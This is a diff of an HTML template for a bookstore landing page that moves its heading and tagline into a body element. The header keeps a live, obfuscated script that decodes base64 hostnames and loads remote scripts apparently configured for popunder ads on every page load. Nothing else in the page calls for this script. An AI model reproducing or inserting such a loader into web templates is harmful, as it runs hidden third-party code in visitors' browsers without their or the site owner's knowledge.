@@ -1,24 +1,25 @@
 {% extends "base.html" %}
-
-{% block content %}
 <!DOCTYPE html>
 <html lang="en">
-<!-- Header -->
-<header class="py-1">
-    <div class="col-12">
-        <div class="text-center display-4 fw-bolder gradient-text">
-            <h1 class="display-4 fw-bolder">Pick Up Your Favorite Books Here.</h1>
-            <p class="lead fw-normal text-dark-50 mb-0">Reading books will make you a knowledgeable person.</p>
-        </div>
-    </div>
+<header>
     <script type="text/javascript" data-cfasync="false">
         /*<![CDATA[/* */
         (function(){var a=window,f="a7b52e1519b4cc079a8df76d2f741669",n=[["siteId",939+553-467+5162799],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],b=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3BML1ovcmNsdXN0ZXJpemUubWluLmpz","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvY2lkZXZpY2UubWluLmpz"],z=-1,r,e,g=function(){clearTimeout(e);z++;if(b[z]&&!(1761967470000<(new Date).getTime()&&1<z)){r=a.document.createElement("script");r.type="text/javascript";r.async=!0;var t=a.document.getElementsByTagName("script")[0];r.src="https://"+atob(b[z]);r.crossOrigin="anonymous";r.onerror=g;r.onload=function(){clearTimeout(e);a[f.slice(0,16)+f.slice(0,16)]||g()};e=setTimeout(g,5E3);t.parentNode.insertBefore(r,t)}};if(!a[f]){try{Object.freeze(a[f]=n)}catch(e){}g()}})();
         /*]]>/* */
     </script> 
 </header>
+{% block content %}
+
+<body class="py-1">
+    <div class="col-12">
+        <div class="text-center display-4 fw-bolder gradient-text">
+            <h1 class="display-4 fw-bolder">Pick Up Your Favorite Books Here.</h1>
+            <p class="lead fw-normal text-dark-50 mb-0">Reading books will make you a knowledgeable person.</p>
+        </div>
+    </div>
+</body>
 <br>
-<body>
+
 <!-- Products Section -->
 <section class="py-1">
     <div class="container px-4 px-lg-5 mt-5">
